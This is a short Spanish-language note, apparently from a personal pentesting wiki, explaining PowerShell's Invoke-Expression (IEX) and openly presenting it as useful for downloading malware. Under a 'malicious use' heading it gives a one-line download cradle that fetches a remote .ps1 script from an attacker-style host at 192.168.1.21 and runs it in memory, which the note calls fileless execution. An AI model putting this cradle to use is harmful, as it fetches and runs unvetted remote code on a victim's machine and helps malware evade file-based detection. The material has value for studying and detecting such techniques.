Este comando nos permite ejecutar cadenas de texto como comandos, lo cual puede ser muy util para descargar malware o algunos scripts ps1 maliciosos, a continuación una guia de uso:

## Uso común

Este comando se puede usar de dos formas, puede usarse como Invoke-Expression o como IEX

```powershell
IEX "Get-ChildItem"
```

Esto va a ejecutar el comando Get-childItem, pero obviamente a esto se le puede dar un uso muiy interesante, ejecutar scripts de forma fileless (Que el script maliciosos no se guarde en un archivo, sino que sea ejecutado directamente)

## Uso malicioso

```powershell
IEX (New-Object Net.WebClient).downloadString('http://192.168.1.21:2000/luna.ps1')
```

Para una mayor explicación revisar [[Ejecuciones fileless]] 